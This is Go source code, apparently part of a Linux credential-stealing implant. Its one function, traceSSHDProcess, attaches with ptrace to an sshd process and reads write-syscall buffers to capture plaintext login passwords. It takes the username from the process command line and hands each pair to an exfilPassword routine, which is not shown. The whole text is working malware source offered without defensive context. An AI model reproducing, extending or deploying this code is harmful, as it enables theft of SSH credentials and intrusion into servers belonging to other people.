package main

import (
	"fmt"
	"io/ioutil"
	"regexp"
	"runtime"
	"syscall"
)

func traceSSHDProcess(pid int) {
	runtime.LockOSThread()
	defer runtime.UnlockOSThread()
	err := syscall.PtraceAttach(pid)
	if err != nil {
		return
	}
	defer func() {
		syscall.PtraceDetach(pid)
	}()
	var wstatus syscall.WaitStatus
	var exfiled bool
	for {
		_, err := syscall.Wait4(pid, &wstatus, 0, nil)
		if err != nil {
			return
		}

		if wstatus.Exited() {
			return
		}

		if wstatus.StopSignal() == syscall.SIGTRAP {
			var regs syscall.PtraceRegs
			err := syscall.PtraceGetRegs(pid, &regs)
			if err != nil {
				syscall.PtraceDetach(pid)
				return
			}

			if regs.Orig_rax == 1 {
				fd := int(regs.Rdi)
				if fd >= 0 && fd <= 10 {
					bufferSize := int(regs.Rdx)
					if bufferSize > 4 && bufferSize < 250 {
						buffer := make([]byte, bufferSize)
						_, err := syscall.PtracePeekData(pid, uintptr(regs.Rsi), buffer)
						if err != nil {
							syscall.PtraceSyscall(pid, 0)
							continue
						}

						var password string
						if len(buffer) >= 4 && buffer[0] == 0 && buffer[1] == 0 && buffer[2] == 0 {
							length := int(buffer[3])
							if length > 0 && length+4 <= len(buffer) {
								password = string(buffer[4 : 4+length])
							} else if length == 0 && len(buffer) > 4 {
								password = string(buffer)
							}
						} else {
							password = string(buffer)
						}

						password = removeNonPrintableAscii(password)
						if isValidPassword(password) {
							username := "root"
							cmdline, _ := ioutil.ReadFile(fmt.Sprintf("/proc/%d/cmdline", pid))
							matches := regexp.MustCompile(`sshd: ([a-zA-Z]+) \[net\]`).FindSubmatch(cmdline)
							if len(matches) == 2 {
								username = string(matches[1])
							}

							if exfiled {
								go exfilPassword(username, password)
							}
							exfiled = !exfiled
						}
					}
				}
			}
		}

		err = syscall.PtraceSyscall(pid, 0)
		if err != nil {
			return
		}
	}
}
